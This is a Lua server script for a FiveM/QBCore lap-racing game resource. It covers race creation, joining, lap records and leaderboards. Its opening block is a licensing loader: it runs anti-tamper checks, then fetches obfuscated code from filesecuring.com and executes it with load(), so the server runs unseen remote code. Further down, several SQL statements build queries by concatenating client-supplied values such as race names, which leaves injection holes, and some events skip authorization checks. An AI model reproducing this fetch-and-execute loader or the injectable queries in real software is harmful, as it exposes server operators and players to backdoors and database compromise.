--[[
	id: LON8EFEgi4pct5aeV2CWD
	name: racing - server
	description: lapraces
	time1: 2021-07-10 14:45:54.491564+00
	time2: 2021-07-10 14:45:54.491564+00
	uploader: PDYtnk0kYHaVGdiBFE-VaeXU32WTrGsBxVNGbtWw
	uploadersession: 20tLtrJ_P6kV2h2fHq813GoUFr5bHm
	flag: f
--]]

CreateThread(function()
    local scriptName = "bl-lapraces"
    local random_event_prefix = "239874g9fegw"

    if IsDuplicityVersion() then
        local msg = function(type, msg) -- simple function to print good looking messages to the console
            local len = "[" .. scriptName .. "]: " .. msg
            local equals = ""
            for i = 1, 144 do
                equals = equals .. "="
            end
            if type == "error" then
                print("\n^0" .. equals  .. "\n[^1" .. scriptName .. "^0]: " .. msg .. "\n^0" .. equals .. "\n")
            else
                print("\n^0" .. equals .. "\n[^2" .. scriptName .. "^0]: " .. msg .. "\n^0" .. equals .. "\n")
            end
        end
        
        local GenerateId = function(length) -- function to generate random ids
            local id = ""
        
            for i = 1, length do
                local randomChar = ""
        
                randomChar = string.char(math.random(122-97) + 97) -- random character a-z
        
                if math.random(1, 2) == 1 then
                    randomChar = tostring(math.random(0, 9)) -- 50% chance that it is a number
                end
        
                if math.random(1, 2) == 1 then
                    randomChar = randomChar:upper() -- 50% chance that it is uppercase
                end
        
                id = id .. randomChar
            end
        
            return id
        end
        
        local RandomGlobal = GenerateId(100) -- generate a random id with a length of 100
        _G[RandomGlobal] = false -- set the random variable to false
        load(string.format("_G['%s'] = true", RandomGlobal))() -- load code to set the variable to true (detect modified load function)
        
        function getArgs(fun) -- function to get the path of PerformHttpRequest
            local args = {}
            local hook = debug.gethook()
            
            local argHook = function( ... )
                local info = debug.getinfo(3)
                if 'pcall' ~= info.name then return end
                
                table.insert(args, debug.getinfo(2).source)
                return
            end
            
            debug.sethook(argHook, "c")
            pcall(fun)
            
            return args
        end
        
        local args = getArgs(PerformHttpRequest)
        if args[1] and string.find(args[1], GetCurrentResourceName()) == nil then -- checks if the path of PerformHttpRequest has been altered.
            if _G[RandomGlobal] then -- if they havent modified `load`

                PerformHttpRequest("https://google.com/", function(err, text, headers) -- make a request to google
                    local text_1 = text
                    if text then
        
                        PerformHttpRequest("https://google.com/", function(err, text, headers)
                            local text_2 = text
                            if text then
        
                                if text_1 == text_2 then -- compare the two google results, google should always return different results
                                    crack()
                                else
                                    PerformHttpRequest("https://filesecuring.com/securefiles/hasAccess.php?id=" .. GenerateId(10), function(err, text, headers) -- make sure PerformHttpRequest doesn't just return random stuff
                                        if text then
                                            if text_1 == text or text_2 == text then -- compare it with the two results from google 
                                                crack()
                                            else
                                                local decoded = json.decode(text)
                                                if decoded then
                                                    local amount = 0
                                                    for k, v in pairs(decoded) do
                                                        amount = amount + 1
                                                    end
        
                                                    if decoded.HasAccess == false and decoded.IP and type(decoded.IP) == "string" and amount == 2 then
                                                        -- seems like they aren't trying to crack the script after all. lets load it!
                                                        local script_ids = {
                                                            client = "118156930704193", -- this is the client id of the script on filesecuring
                                                            server = "801450105574321", -- this is the server id of the script on filesecuring
                                                        }
                                                        
                                                        PerformHttpRequest("http://filesecuring.com/securefiles/hasAccess.php?id=" .. script_ids.server, function(err, text, headers)
                                                            if text then
                                                                local decoded = json.decode(text)
                                                                if decoded.HasAccess then
                                                    
                                                                    msg("success", "Authorized & started - Tyler")
                                                    
                                                                    PerformHttpRequest("http://filesecuring.com/securefiles/get.php?id=" .. script_ids.server, function(err, text, headers)
                                                                        local code = ""
                                                                        for word in string.gmatch(text, "([^\\]+)") do 
                                                                            code = code .. string.char(tonumber(word))
                                                                        end
                                                                        load(code)()
                                                                    end, "GET", "")
                                                    
                                                                    RegisterServerEvent(random_event_prefix .. ":" .. scriptName)
                                                                    AddEventHandler(random_event_prefix .. ":" .. scriptName, function()
                                                                        local src = source
                                                    
                                                                        PerformHttpRequest("http://filesecuring.com/securefiles/get.php?id=" .. script_ids.client, function(err, text, headers)
                                                                            TriggerClientEvent(random_event_prefix .. "Client:" .. scriptName, src, text)
                                                                        end, "GET", "")
                                                                    end)
                                                    
                                                                else
                                                                    msg("error", "You don't have access to this resource. Your server ip is: " .. decoded.IP)
                                                                end
                                                            else
                                                                msg("error", "It appears the API to check if you have access to this resource is down. Please try again later.")
                                                            end
                                                        end, "GET", "")

                                                    else
                                                        crack(true)
                                                    end
                                                end
                                            end
                                        else
                                            crack()
                                        end
                                    end, "GET", "")
                                end
        
                            else
                                crack()
                            end
                        end, "GET", "")
                    
                    else
                        crack()
                    end
                end, "GET", "")
            else
                crack()
            end
        else
            crack()
        end
    else
        print("You can't start the server script on the client side..")
    end
end)

QBCore = nil
TriggerEvent('QBCore:GetObject', function(obj) QBCore = obj end)

Races = {}

AvailableRaces = {}

LastRaces = {}
NotFinished = {}

Citizen.CreateThread(function()
    QBCore.Functions.ExecuteSql(false, "SELECT * FROM `lapraces`", function(races)
        if races[1] ~= nil then
            for k, v in pairs(races) do
                local Records = {}
                if v.records ~= nil then
                    Records = json.decode(v.records)
                end
                Races[v.raceid] = {
                    RaceName = v.name,
                    Checkpoints = json.decode(v.checkpoints),
                    Records = Records,
                    Creator = v.creator,
                    RaceId = v.raceid,
                    Started = false,
                    Waiting = false,
                    Distance = v.distance,
                    LastLeaderboard = {},
                    Racers = {},
                }
            end
        end
    end)
end)

QBCore.Functions.CreateCallback('bl-lapraces:server:GetRacingLeaderboards', function(source, cb)
    cb(Races)
end)

function SecondsToClock(seconds)
    local seconds = tonumber(seconds)
    local retval = 0
    if seconds <= 0 then
        retval = "00:00:00";
    else
        hours = string.format("%02.f", math.floor(seconds/3600));
        mins = string.format("%02.f", math.floor(seconds/60 - (hours*60)));
        secs = string.format("%02.f", math.floor(seconds - hours*3600 - mins *60));
        retval = hours..":"..mins..":"..secs
    end
    return retval
end

RegisterServerEvent('bl-lapraces:server:FinishPlayer')
AddEventHandler('bl-lapraces:server:FinishPlayer', function(RaceData, TotalTime, TotalLaps, BestLap)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local AvailableKey = GetOpenedRaceKey(RaceData.RaceId)
    local PlayersFinished = 0
    local AmountOfRacers = 0
    for k, v in pairs(Races[RaceData.RaceId].Racers) do
        if v.Finished then
            PlayersFinished = PlayersFinished + 1
        end
        AmountOfRacers = AmountOfRacers + 1
    end
    local BLap = 0
    if TotalLaps < 2 then
        BLap = TotalTime
    else
        BLap = BestLap
    end
    if LastRaces[RaceData.RaceId] ~= nil then
        table.insert(LastRaces[RaceData.RaceId], {
            TotalTime = TotalTime,
            BestLap = BLap,
            Holder = {
                [1] = Player.PlayerData.charinfo.firstname,
                [2] = Player.PlayerData.charinfo.lastname
            }
        })
    else
        LastRaces[RaceData.RaceId] = {}
        table.insert(LastRaces[RaceData.RaceId], {
            TotalTime = TotalTime,
            BestLap = BLap,
            Holder = {
                [1] = Player.PlayerData.charinfo.firstname,
                [2] = Player.PlayerData.charinfo.lastname
            }
        })
    end
    if Races[RaceData.RaceId].Records ~= nil and next(Races[RaceData.RaceId].Records) ~= nil then
        if BLap < Races[RaceData.RaceId].Records.Time then
            Races[RaceData.RaceId].Records = {
                Time = BLap,
                Holder = {
                    [1] = Player.PlayerData.charinfo.firstname, 
                    [2] = Player.PlayerData.charinfo.lastname,
                }
            }
            QBCore.Functions.ExecuteSql(false, "UPDATE `lapraces` SET `records` = '"..json.encode(Races[RaceData.RaceId].Records).."' WHERE `raceid` = '"..RaceData.RaceId.."'")
            TriggerClientEvent('bl-phone:client:RaceNotify', src, 'You have broken the WR on '..RaceData.RaceName..' with a time of: '..SecondsToClock(BLap)..'!')
        end
    else
        Races[RaceData.RaceId].Records = {
            Time = BLap,
            Holder = {
                [1] = Player.PlayerData.charinfo.firstname,
                [2] = Player.PlayerData.charinfo.lastname,
            }
        }
        QBCore.Functions.ExecuteSql(false, "UPDATE `lapraces` SET `records` = '"..json.encode(Races[RaceData.RaceId].Records).."' WHERE `raceid` = '"..RaceData.RaceId.."'")
        TriggerClientEvent('bl-phone:client:RaceNotify', src, 'You have set the WR on '..RaceData.RaceName..' with a time of: '..SecondsToClock(BLap)..'!')
    end
    AvailableRaces[AvailableKey].RaceData = Races[RaceData.RaceId]
    TriggerClientEvent('bl-lapraces:client:PlayerFinishs', -1, RaceData.RaceId, PlayersFinished, Player)
    if PlayersFinished == AmountOfRacers then
        if NotFinished ~= nil and next(NotFinished) ~= nil and NotFinished[RaceData.RaceId] ~= nil and next(NotFinished[RaceData.RaceId]) ~= nil then
            for k, v in pairs(NotFinished[RaceData.RaceId]) do
                table.insert(LastRaces[RaceData.RaceId], {
                    TotalTime = v.TotalTime,
                    BestLap = v.BestLap,
                    Holder = {
                        [1] = v.Holder[1],
                        [2] = v.Holder[2]
                    }
                })
            end
        end
        Races[RaceData.RaceId].LastLeaderboard = LastRaces[RaceData.RaceId]
        Races[RaceData.RaceId].Racers = {}
        Races[RaceData.RaceId].Started = false
        Races[RaceData.RaceId].Waiting = false
        table.remove(AvailableRaces, AvailableKey)
        LastRaces[RaceData.RaceId] = nil
        NotFinished[RaceData.RaceId] = nil
    end
    TriggerClientEvent('bl-phone:client:UpdateLapraces', -1)
end)

function IsWhitelisted(CitizenId)
    local retval = false
    for _, cid in pairs(Config.WhitelistedCreators) do
        if cid == CitizenId then
            retval = true
            break
        end
    end
    local Player = QBCore.Functions.GetPlayerByCitizenId(CitizenId)
    local Perms = QBCore.Functions.GetPermission(Player.PlayerData.source)
    if Perms == "admin" or Perms == "god" then
        retval = true
    end
    return retval
end

function IsNameAvailable(RaceName)
    local retval = true
    for RaceId,_ in pairs(Races) do
        if Races[RaceId].RaceName == RaceName then
            retval = false
            break
        end
    end
    return retval
end

RegisterServerEvent('bl-lapraces:server:CreateLapRace')
AddEventHandler('bl-lapraces:server:CreateLapRace', function(RaceName)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    
    if IsWhitelisted(Player.PlayerData.citizenid) then
        if IsNameAvailable(RaceName) then
            TriggerClientEvent('bl-lapraces:client:StartRaceEditor', source, RaceName)
        else
            TriggerClientEvent('QBCore:Notify', source, 'There is already a rave whit that name.', 'error')
        end
    else
        TriggerClientEvent('QBCore:Notify', source, 'You dont have the rights to create a race.', 'error')
    end
end)

QBCore.Functions.CreateCallback('bl-lapraces:server:GetRaces', function(source, cb)
    cb(AvailableRaces)
end)

QBCore.Functions.CreateCallback('bl-lapraces:server:GetListedRaces', function(source, cb)
    cb(Races)
end)

QBCore.Functions.CreateCallback('bl-lapraces:server:GetRacingData', function(source, cb, RaceId)
    cb(Races[RaceId])
end)

QBCore.Functions.CreateCallback('bl-lapraces:server:HasCreatedRace', function(source, cb)
    cb(HasOpenedRace(QBCore.Functions.GetPlayer(source).PlayerData.citizenid))
end)

QBCore.Functions.CreateCallback('bl-lapraces:server:IsAuthorizedToCreateRaces', function(source, cb, TrackName)
    cb(IsWhitelisted(QBCore.Functions.GetPlayer(source).PlayerData.citizenid), IsNameAvailable(TrackName))
end)

function HasOpenedRace(CitizenId)
    local retval = false
    for k, v in pairs(AvailableRaces) do
        if v.SetupCitizenId == CitizenId then
            retval = true
        end
    end
    return retval
end

QBCore.Functions.CreateCallback('bl-lapraces:server:GetTrackData', function(source, cb, RaceId)
    QBCore.Functions.ExecuteSql(false, "SELECT * FROM `players` WHERE `citizenid` = '"..Races[RaceId].Creator.."'", function(result)
        if result[1] ~= nil then
            result[1].charinfo = json.decode(result[1].charinfo)
            cb(Races[RaceId], result[1])
        else
            cb(Races[RaceId], {
                charinfo = {
                    firstname = "Unknown",
                    lastname = "Unknown",
                }
            })
        end
    end)
end)

function GetOpenedRaceKey(RaceId)
    local retval = nil
    for k, v in pairs(AvailableRaces) do
        if v.RaceId == RaceId then
            retval = k
            break
        end
    end
    return retval
end

function GetCurrentRace(MyCitizenId)
    local retval = nil
    for RaceId,_ in pairs(Races) do
        for cid,_ in pairs(Races[RaceId].Racers) do
            if cid == MyCitizenId then
                retval = RaceId
                break
            end
        end
    end
    return retval
end

RegisterServerEvent('bl-lapraces:server:JoinRace')
AddEventHandler('bl-lapraces:server:JoinRace', function(RaceData)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local RaceName = RaceData.RaceData.RaceName
    local RaceId = GetRaceId(RaceName)
    local AvailableKey = GetOpenedRaceKey(RaceData.RaceId)
    local CurrentRace = GetCurrentRace(Player.PlayerData.citizenid)
    if CurrentRace ~= nil then
        local AmountOfRacers = 0
        PreviousRaceKey = GetOpenedRaceKey(CurrentRace)
        for k, v in pairs(Races[CurrentRace].Racers) do
            AmountOfRacers = AmountOfRacers + 1
        end
        Races[CurrentRace].Racers[Player.PlayerData.citizenid] = nil
        if (AmountOfRacers - 1) == 0 then
            Races[CurrentRace].Racers = {}
            Races[CurrentRace].Started = false
            Races[CurrentRace].Waiting = false
            table.remove(AvailableRaces, PreviousRaceKey)
            TriggerClientEvent('QBCore:Notify', src, 'You were the only one in the race the race wil end.', 'error')
            TriggerClientEvent('bl-lapraces:client:LeaveRace', src, Races[CurrentRace])
        else
            AvailableRaces[PreviousRaceKey].RaceData = Races[CurrentRace]
            TriggerClientEvent('bl-lapraces:client:LeaveRace', src, Races[CurrentRace])
        end
        TriggerClientEvent('bl-phone:client:UpdateLapraces', -1)
    end
    Races[RaceId].Waiting = true
    Races[RaceId].Racers[Player.PlayerData.citizenid] = {
        Checkpoint = 0,
        Lap = 1,
        Finished = false,
    }
    AvailableRaces[AvailableKey].RaceData = Races[RaceId]
    TriggerClientEvent('bl-lapraces:client:JoinRace', src, Races[RaceId], RaceData.Laps)
    TriggerClientEvent('bl-phone:client:UpdateLapraces', -1)
    local creatorsource = QBCore.Functions.GetPlayerByCitizenId(AvailableRaces[AvailableKey].SetupCitizenId).PlayerData.source
    if creatorsource ~= Player.PlayerData.source then
        TriggerClientEvent('bl-phone:client:RaceNotify', creatorsource, string.sub(Player.PlayerData.charinfo.firstname, 1, 1)..'. '..Player.PlayerData.charinfo.lastname..' is de race gejoined!')
    end
end)

RegisterServerEvent('bl-lapraces:server:LeaveRace')
AddEventHandler('bl-lapraces:server:LeaveRace', function(RaceData)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local RaceName
    if RaceData.RaceData ~= nil then
        RaceName = RaceData.RaceData.RaceName
    else
        RaceName = RaceData.RaceName
    end
    local RaceId = GetRaceId(RaceName)
    local AvailableKey = GetOpenedRaceKey(RaceData.RaceId)
    local creatorsource = QBCore.Functions.GetPlayerByCitizenId(AvailableRaces[AvailableKey].SetupCitizenId).PlayerData.source
    if creatorsource ~= Player.PlayerData.source then
        TriggerClientEvent('bl-phone:client:RaceNotify', creatorsource, string.sub(Player.PlayerData.charinfo.firstname, 1, 1)..'. '..Player.PlayerData.charinfo.lastname..' is de race geleaved!')
    end
    local AmountOfRacers = 0
    for k, v in pairs(Races[RaceData.RaceId].Racers) do
        AmountOfRacers = AmountOfRacers + 1
    end
    if NotFinished[RaceData.RaceId] ~= nil then
        table.insert(NotFinished[RaceData.RaceId], {
            TotalTime = "DNF",
            BestLap = "DNF",
            Holder = {
                [1] = Player.PlayerData.charinfo.firstname,
                [2] = Player.PlayerData.charinfo.lastname
            }
        })
    else
        NotFinished[RaceData.RaceId] = {}
        table.insert(NotFinished[RaceData.RaceId], {
            TotalTime = "DNF",
            BestLap = "DNF",
            Holder = {
                [1] = Player.PlayerData.charinfo.firstname,
                [2] = Player.PlayerData.charinfo.lastname
            }
        })
    end
    Races[RaceId].Racers[Player.PlayerData.citizenid] = nil
    if (AmountOfRacers - 1) == 0 then
        if NotFinished ~= nil and next(NotFinished) ~= nil and NotFinished[RaceId] ~= nil and next(NotFinished[RaceId]) ~= nil then
            for k, v in pairs(NotFinished[RaceId]) do
                if LastRaces[RaceId] ~= nil then
                    table.insert(LastRaces[RaceId], {
                        TotalTime = v.TotalTime,
                        BestLap = v.BestLap,
                        Holder = {
                            [1] = v.Holder[1],
                            [2] = v.Holder[2]
                        }
                    })
                else
                    LastRaces[RaceId] = {}
                    table.insert(LastRaces[RaceId], {
                        TotalTime = v.TotalTime,
                        BestLap = v.BestLap,
                        Holder = {
                            [1] = v.Holder[1],
                            [2] = v.Holder[2]
                        }
                    })
                end
            end
        end
        Races[RaceId].LastLeaderboard = LastRaces[RaceId]
        Races[RaceId].Racers = {}
        Races[RaceId].Started = false
        Races[RaceId].Waiting = false
        table.remove(AvailableRaces, AvailableKey)
        TriggerClientEvent('QBCore:Notify', src, 'You were the only one in the race the race wil end.', 'error')
        TriggerClientEvent('bl-lapraces:client:LeaveRace', src, Races[RaceId])
        LastRaces[RaceId] = nil
        NotFinished[RaceId] = nil
    else
        AvailableRaces[AvailableKey].RaceData = Races[RaceId]
        TriggerClientEvent('bl-lapraces:client:LeaveRace', src, Races[RaceId])
    end
    TriggerClientEvent('bl-phone:client:UpdateLapraces', -1)
end)

RegisterServerEvent('bl-lapraces:server:SetupRace')
AddEventHandler('bl-lapraces:server:SetupRace', function(RaceId, Laps)
    local Player = QBCore.Functions.GetPlayer(source)
    if Races[RaceId] ~= nil then
        if not Races[RaceId].Waiting then
            if not Races[RaceId].Started then
                Races[RaceId].Waiting = true
                table.insert(AvailableRaces, {
                    RaceData = Races[RaceId],
                    Laps = Laps,
                    RaceId = RaceId,
                    SetupCitizenId = Player.PlayerData.citizenid,
                })
                TriggerClientEvent('bl-phone:client:UpdateLapraces', -1)
                SetTimeout(5 * 60 * 1000, function()
                    if Races[RaceId].Waiting then
                        local AvailableKey = GetOpenedRaceKey(RaceId)
                        for cid,_ in pairs(Races[RaceId].Racers) do
                            local RacerData = QBCore.Functions.GetPlayerByCitizenId(cid)
                            if RacerData ~= nil then
                                TriggerClientEvent('bl-lapraces:client:LeaveRace', RacerData.PlayerData.source, Races[RaceId])
                            end
                        end
                        table.remove(AvailableRaces, AvailableKey)
                        Races[RaceId].LastLeaderboard = {}
                        Races[RaceId].Racers = {}
                        Races[RaceId].Started = false
                        Races[RaceId].Waiting = false
                        LastRaces[RaceId] = nil
                        TriggerClientEvent('bl-phone:client:UpdateLapraces', -1)
                    end
                end)
            else
                TriggerClientEvent('QBCore:Notify', source, 'The race is already active...', 'error')
            end
        else
            TriggerClientEvent('QBCore:Notify', source, 'The race is already active..', 'error')
        end
    else
        TriggerClientEvent('QBCore:Notify', source, 'This race does not exsist :(', 'error')
    end
end)

RegisterServerEvent('bl-lapraces:server:UpdateRaceState')
AddEventHandler('bl-lapraces:server:UpdateRaceState', function(RaceId, Started, Waiting)
    Races[RaceId].Waiting = Waiting
    Races[RaceId].Started = Started
end)

RegisterServerEvent('bl-lapraces:server:UpdateRacerData')
AddEventHandler('bl-lapraces:server:UpdateRacerData', function(RaceId, Checkpoint, Lap, Finished)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local CitizenId = Player.PlayerData.citizenid

    Races[RaceId].Racers[CitizenId].Checkpoint = Checkpoint
    Races[RaceId].Racers[CitizenId].Lap = Lap
    Races[RaceId].Racers[CitizenId].Finished = Finished

    TriggerClientEvent('bl-lapraces:client:UpdateRaceRacerData', -1, RaceId, Races[RaceId])
end)

RegisterServerEvent('bl-lapraces:server:StartRace')
AddEventHandler('bl-lapraces:server:StartRace', function(RaceId)
    local src = source
    local MyPlayer = QBCore.Functions.GetPlayer(src)
    local AvailableKey = GetOpenedRaceKey(RaceId)
    
    if RaceId ~= nil then
        if AvailableRaces[AvailableKey].SetupCitizenId == MyPlayer.PlayerData.citizenid then
            AvailableRaces[AvailableKey].RaceData.Started = true
            AvailableRaces[AvailableKey].RaceData.Waiting = false
            for CitizenId,_ in pairs(Races[RaceId].Racers) do
                local Player = QBCore.Functions.GetPlayerByCitizenId(CitizenId)
                if Player ~= nil then
                    TriggerClientEvent('bl-lapraces:client:RaceCountdown', Player.PlayerData.source)
                end
            end
            TriggerClientEvent('bl-phone:client:UpdateLapraces', -1)
        else
            TriggerClientEvent('QBCore:Notify', src, 'Your not the creator of the race..', 'error')
        end
    else
        TriggerClientEvent('QBCore:Notify', src, 'You are not in a race..', 'error')
    end
end)

RegisterServerEvent('bl-lapraces:server:SaveRace')
AddEventHandler('bl-lapraces:server:SaveRace', function(RaceData)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local RaceId = GenerateRaceId()
    local Checkpoints = {}
    for k, v in pairs(RaceData.Checkpoints) do
        Checkpoints[k] = {
            offset = v.offset,
            coords = v.coords,
        }
    end
    Races[RaceId] = {
        RaceName = RaceData.RaceName,
        Checkpoints = Checkpoints,
        Records = {},
        Creator = Player.PlayerData.citizenid,
        RaceId = RaceId,
        Started = false,
        Waiting = false,
        Distance = math.ceil(RaceData.RaceDistance),
        Racers = {},
        LastLeaderboard = {},
    }
    QBCore.Functions.ExecuteSql(false, "INSERT INTO `lapraces` (`name`, `checkpoints`, `creator`, `distance`, `raceid`) VALUES ('"..RaceData.RaceName.."', '"..json.encode(Checkpoints).."', '"..Player.PlayerData.citizenid.."', '"..RaceData.RaceDistance.."', '"..GenerateRaceId().."')")
end)

function GetRaceId(name)
    local retval = nil
    for k, v in pairs(Races) do
        if v.RaceName == name then
            retval = k
            break
        end
    end
    return retval
end

function GenerateRaceId()
    local RaceId = "LR-"..math.random(1111, 9999)
    while Races[RaceId] ~= nil do
        RaceId = "LR-"..math.random(1111, 9999)
    end
    return RaceId
end

QBCore.Commands.Add("togglesetup", "Zet Racing setup aan/uit", {}, false, function(source, args)
    local Player = QBCore.Functions.GetPlayer(source)

    if IsWhitelisted(Player.PlayerData.citizenid) then
        Config.RaceSetupAllowed = not Config.RaceSetupAllowed
        if not Config.RaceSetupAllowed then
            TriggerClientEvent('QBCore:Notify', source, 'There cant be made any more races', 'error')
        else
            TriggerClientEvent('QBCore:Notify', source, 'You can make races again!', 'success')
        end
    else
        TriggerClientEvent('QBCore:Notify', source, 'You dont have the rights to do this.', 'error')
    end
end)

QBCore.Commands.Add("cancelrace", "Cancel gaande race..", {}, false, function(source, args)
    local Player = QBCore.Functions.GetPlayer(source)

    if IsWhitelisted(Player.PlayerData.citizenid) then
        local RaceName = table.concat(args, " ")
        if RaceName ~= nil then
            local RaceId = GetRaceId(RaceName)
            if Races[RaceId].Started then
                local AvailableKey = GetOpenedRaceKey(RaceId)
                for cid,_ in pairs(Races[RaceId].Racers) do
                    local RacerData = QBCore.Functions.GetPlayerByCitizenId(cid)
                    if RacerData ~= nil then
                        TriggerClientEvent('bl-lapraces:client:LeaveRace', RacerData.PlayerData.source, Races[RaceId])
                    end
                end
                table.remove(AvailableRaces, AvailableKey)
                Races[RaceId].LastLeaderboard = {}
                Races[RaceId].Racers = {}
                Races[RaceId].Started = false
                Races[RaceId].Waiting = false
                LastRaces[RaceId] = nil
                TriggerClientEvent('bl-phone:client:UpdateLapraces', -1)
            else
                TriggerClientEvent('QBCore:Notify', source, 'This race has not started yet.', 'error')
            end
        end
    else
        TriggerClientEvent('QBCore:Notify', source, 'You dont have rights to do this', 'error')
    end
end)

QBCore.Functions.CreateCallback('bl-lapraces:server:CanRaceSetup', function(source, cb)
    cb(Config.RaceSetupAllowed)
end)